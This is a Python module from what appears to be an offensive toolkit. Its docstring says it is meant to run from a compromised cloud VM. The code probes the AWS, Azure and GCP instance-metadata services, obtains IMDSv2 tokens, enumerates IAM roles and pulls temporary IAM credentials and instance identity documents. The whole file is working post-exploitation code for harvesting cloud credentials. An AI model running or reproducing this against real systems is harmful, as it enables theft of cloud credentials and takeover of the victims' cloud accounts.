"""Cloud metadata (IMDS) discovery — AWS / Azure / GCP.

When fieldkit runs from a compromised cloud VM (directly, or via
a foothold-derived shell), the instance-metadata service is a
one-hop-away credential jackpot. This module probes the three
big cloud IMDS endpoints + dumps whatever they surface.

Endpoints:
  * AWS: 169.254.169.254/latest/meta-data/iam/security-credentials/
    - v1 (unauth GET) and v2 (PUT-token first)
  * Azure: 169.254.169.254/metadata/instance?api-version=2021-02-01
    - requires Metadata: true header
  * GCP: metadata.google.internal/computeMetadata/v1/instance/
    - requires Metadata-Flavor: Google header

All three endpoints resolve to the same IP (169.254.169.254) —
provider identification is via the response shape.
"""
import json
import urllib.error
import urllib.request
from dataclasses import dataclass


IMDS_AWS_V1_ROOT = "http://169.254.169.254/latest/meta-data/"
IMDS_AWS_V1_CREDS = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
IMDS_AWS_V2_TOKEN = "http://169.254.169.254/latest/api/token"
IMDS_AZURE = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
IMDS_GCP = "http://metadata.google.internal/computeMetadata/v1/?recursive=true"


@dataclass(frozen=True)
class ImdsResult:
    """Outcome of probing one cloud's IMDS."""
    provider: str        # "aws" / "azure" / "gcp"
    reachable: bool
    identity: dict       # per-provider identity dict (may be empty)
    creds: dict          # temporary creds when the endpoint exposes them
    error: str = ""


def _fetch(url, headers=None, timeout=3):
    """One HTTP GET. Returns (status, body_str) or raises."""
    req = urllib.request.Request(url, headers=headers or {})
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.status, resp.read().decode("utf-8", errors="replace")


def probe_aws(timeout=3):
    """AWS IMDS probe — tries v2 (token-required) first, falls
    back to v1 (unauth). Returns identity + temporary IAM
    credentials when they land."""
    identity, creds = {}, {}
    # v2: PUT to token endpoint
    token = None
    try:
        req = urllib.request.Request(
            IMDS_AWS_V2_TOKEN, method="PUT",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            token = resp.read().decode("utf-8").strip()
    except Exception:                                       # noqa: BLE001
        pass
    hdrs = {"X-aws-ec2-metadata-token": token} if token else {}
    try:
        # list role names
        status, body = _fetch(IMDS_AWS_V1_CREDS,
                                headers=hdrs, timeout=timeout)
        role = body.strip().splitlines()[0] if body.strip() else ""
        if role:
            _, cred_body = _fetch(IMDS_AWS_V1_CREDS + role,
                                    headers=hdrs, timeout=timeout)
            try:
                creds = json.loads(cred_body)
            except json.JSONDecodeError:
                pass
        # identity doc
        try:
            _, id_body = _fetch(
                "http://169.254.169.254/latest/dynamic/instance-identity/document",
                headers=hdrs, timeout=timeout)
            identity = json.loads(id_body)
        except Exception:                                   # noqa: BLE001
            pass
        return ImdsResult(provider="aws", reachable=True,
                            identity=identity, creds=creds)
    except (urllib.error.URLError, TimeoutError) as exc:
        return ImdsResult(provider="aws", reachable=False,
                            identity={}, creds={}, error=str(exc))
    except Exception as exc:                                # noqa: BLE001
        return ImdsResult(provider="aws", reachable=False,
                            identity={}, creds={}, error=str(exc))


def probe_azure(timeout=3):
    """Azure IMDS probe — requires Metadata: true header."""
    try:
        _, body = _fetch(IMDS_AZURE,
                          headers={"Metadata": "true"}, timeout=timeout)
        identity = json.loads(body)
        return ImdsResult(provider="azure", reachable=True,
                            identity=identity, creds={})
    except Exception as exc:                                # noqa: BLE001
        return ImdsResult(provider="azure", reachable=False,
                            identity={}, creds={}, error=str(exc))


def probe_gcp(timeout=3):
    """GCP IMDS probe — requires Metadata-Flavor: Google header."""
    try:
        _, body = _fetch(IMDS_GCP,
                          headers={"Metadata-Flavor": "Google"},
                          timeout=timeout)
        identity = json.loads(body)
        return ImdsResult(provider="gcp", reachable=True,
                            identity=identity, creds={})
    except Exception as exc:                                # noqa: BLE001
        return ImdsResult(provider="gcp", reachable=False,
                            identity={}, creds={}, error=str(exc))


def probe_all(timeout=3):
    """Try every provider. Returns list of :class:`ImdsResult` —
    unreachable providers get ``reachable=False`` + ``error``."""
    return [probe_aws(timeout), probe_azure(timeout), probe_gcp(timeout)]
